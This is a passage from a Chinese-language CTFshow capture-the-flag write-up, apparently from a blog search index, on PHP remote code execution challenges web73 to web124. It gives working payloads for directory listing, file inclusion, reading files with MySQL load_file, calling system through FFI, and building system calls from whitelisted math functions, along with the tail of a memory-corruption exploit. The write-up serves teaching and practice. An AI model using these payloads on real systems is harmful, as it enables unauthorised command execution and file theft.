punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>首先查找flag位置,然后使用文件包含得到flag</p><p>Payload:</p><blockquote><p>1、c&#x3D;var_export(scandir(‘&#x2F;‘));exit(0);c&#x3D;require_once(‘&#x2F;flagc.txt’);exit(0);</p><p>2、c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(‘flagc.txt’);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandir函数被ban了，使用DirectoryIterator类，flag在&#x2F;flagx.txt</p><p>或者使用glob协议</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..’.’&#x2F;*’));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>可以查到flag位置：&#x2F;flag36.txt  但是include被ban了，之前的poc因为strlen被禁了获取不到system地址也没法用了</p><p>可以使用mysql的load_file函数</p><p>先查询数据库</p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">## $rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>查到了ctftraining的数据库，然后使用load_file读取flag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>Payload同上</p><h4 id="web77-FFI-php7-4以上"><a href="#web77-FFI-php7-4以上" class="headerlink" title="web77(FFI php7.4以上)"></a>web77(FFI php7.4以上)</h4><p>FFI，php7.4以上才有</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象<br>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;   &#x2F;&#x2F;没有回显，需要重定向到文件<br>$ffi-&gt;system($a);       &#x2F;&#x2F;通过$ffi去调用system函数</p></blockquote><h4 id="web118-Bash内置变量"><a href="#web118-Bash内置变量" class="headerlink" title="web118(Bash内置变量)"></a>web118(Bash内置变量)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCN初赛原题</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: 收集自网络# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>代码审计</strong></p><p>代码接受GET传参<code>c</code>，保存在<code>content</code>中，并对参数长度进行了限制<code>&lt;80</code>。</p><p>然后设置了一个黑名单，过滤了一些特殊字符，<code>空格</code>和<code>/</code>也给过滤了，所以<code>cat /flag</code>无门。</p><p>接下来提供了一个白名单，里面是一些数学函数，并提供了一个常用数学函数的链接，可以查到这些函数的用法。</p><p>都满足以上条件后，使用<code>eval</code>来执行传入的参数。</p><p>分析到这里，只能利用白名单中提供的函数来构造命令，用到的函数有：</p><ul><li><code>base_convert()</code>：在任意进制之间转换数字</li><li><code>dechex()</code>：将十进制转换成十六进制</li><li><code>hex2bin()</code>：将十六进制转换成ascii字符</li></ul><p><strong>思路是：先利用<code>dechex()</code>将GET传入的十进制数转换成十六进制，再利用<code>hex2bin()</code>将得到的十六进制数转换成ascii字符串。又因为白名单里没有<code>hex2bin()</code>这个函数，所以需要利用<code>base_convert()</code>来将GET传入的十进制数转换成三十六进制（因为三十六进制中含有数字字母）构造出<code>hex2bin</code>，最后将分别传入的字符串拼接即可构造成功。</strong></p><p>*Trick：十进制数<code>37907361743</code>转换成三十六进制之后正好就是<code>hex2bin</code>。</p><p>因为代码中对传入的参数<code>c</code>做了长度限制，但可以通过传入其它参数，在构造出来的语句中调用即可。</p><p>这里还涉及到一个知识点，PHP中可以将函数名保存在一个变量中，然后使用这个变量来替代函数名，例如：</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>利用以上知识点，尝试构造如下payload：</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>构造过程如下：</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;可以代替[]综上：$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GET，即此时的$pi就是_GET</code></pre><p>拼接形成payload：</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;要在请求头里面加一个  1:tac flag.php  见下图</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
